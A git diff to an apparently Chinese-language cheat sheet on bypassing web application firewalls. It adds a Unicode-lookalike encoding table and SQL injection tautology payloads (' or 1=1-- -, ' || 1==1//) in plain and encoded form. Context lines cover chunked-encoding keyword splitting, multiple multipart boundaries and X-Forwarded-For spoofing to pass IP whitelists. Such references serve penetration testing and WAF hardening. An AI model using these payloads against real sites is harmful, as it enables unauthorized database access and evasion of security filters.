@@ -39,6 +39,35 @@ IIS (6, 7.5, 8, 10) on ASP Classic, ASP.NET and PHP7.1- FastCGI
 2. url双编码
 3. hex编码
 4. base64
+5. unicode
+```
+o -> %e1%b4%bc
+r -> %e1%b4%bf
+1 -> %c2%b9
+= -> %e2%81%bc
+/ -> %ef%bc%8f
+- -> %ef%b9%a3
+# -> %ef%b9%9f
+* -> %ef%b9%a1
+' -> %ef%bc%87
+" -> %ef%bc%82
+| -> %ef%bd%9c
+
+
+' or 1=1-- -
+%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3
+
+" or 1=1-- -
+%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3
+
+' || 1==1//
+%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
+
+" || 1==1//
+%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
+```  
+
+参考: https://github.com/carlospolop/sqlmap_to_unicode_template
 ### 分块传输
 在HTTP Hader中加入` Transfer-Encoding: chunked`,表示采用分块编码,每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。
 利用分块传输来分割敏感关键字.
@@ -47,7 +76,7 @@ IIS (6, 7.5, 8, 10) on ASP Classic, ASP.NET and PHP7.1- FastCGI
 ### http协议覆盖绕过
 1. 多boundary定义
 在`Content-type: multipart/form-date`中定义多个`boundary`,导致waf检测范围和上传范围不一致.
-2. 
+1. 
 ### 白名单IP绕过
 针对白名单IP不做检测,而IP从HTTP Header中获取,通过XFF头等进行伪造.
 ### 真实IP绕过
